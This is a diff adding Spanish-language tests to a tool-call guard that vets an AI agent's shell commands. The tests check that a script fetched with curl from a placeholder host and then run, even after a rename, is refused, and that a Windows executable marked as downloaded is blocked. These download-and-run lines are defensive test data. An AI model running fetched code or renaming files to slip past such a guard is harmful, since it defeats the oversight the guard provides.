@@ -299,6 +299,28 @@ describe('guardia de bypass: escritura y shell (disco real)', () => {
     expect(await reason('PowerShell', { command: '$a = "--worktree"; git restore --staged $a src/a.ts' })).toMatch(/git restore no verificables/);
   });
 
+  it('lo que la sesión baja de internet no lo ejecuta; otra sesión sí ejecuta el archivo que ya estaba', async () => {
+    const session = () => createToolGuard({ allowedTools: tools, cwd: root, writeRoots: [root], shellRoot: root });
+    const first = session();
+    const why = async (g: ToolGuard, tool: string, command: string) => {
+      const d = await g.decide(tool, { command });
+      return d.allow ? '' : d.reason;
+    };
+    expect(await why(first, 'Bash', 'curl -o x.sh https://e.invalid/x.sh')).toBe('');
+    writeFileSync(path.join(root, 'x.sh'), 'echo hola\n');
+    expect(await why(first, 'Bash', 'bash x.sh')).toMatch(/x\.sh se bajó de internet en esta sesión/);
+    expect(await why(first, 'PowerShell', '.\\x.sh')).toMatch(/se bajó de internet/);
+    expect(await why(first, 'Bash', 'mv x.sh y.sh')).toBe('');
+    expect(await why(first, 'Bash', 'bash y.sh')).toMatch(/se bajó de internet/);
+    expect(await why(session(), 'Bash', 'bash y.sh')).toBe('');
+  });
+
+  it.runIf(process.platform === 'win32')('niega ejecutar fuera del proyecto lo que bajó el navegador (marca de la web)', async () => {
+    writeFileSync(path.join(outside, 'a.exe'), 'x');
+    writeFileSync(`${path.join(outside, 'a.exe')}:Zone.Identifier`, '[ZoneTransfer]\r\nZoneId=3\r\n');
+    expect(await reason('PowerShell', { command: path.join(outside, 'a.exe') })).toMatch(/viene de internet/);
+  });
+
   it('check síncrono nunca aprueba edición ni shell; el hook y canUseTool usan la decisión completa', async () => {
     expect(guard.check('Write', { file_path: path.join(root, 'a.md'), content: 'x' }).allow).toBe(false);
     expect(guard.check('Bash', { command: 'git status' }).allow).toBe(false);
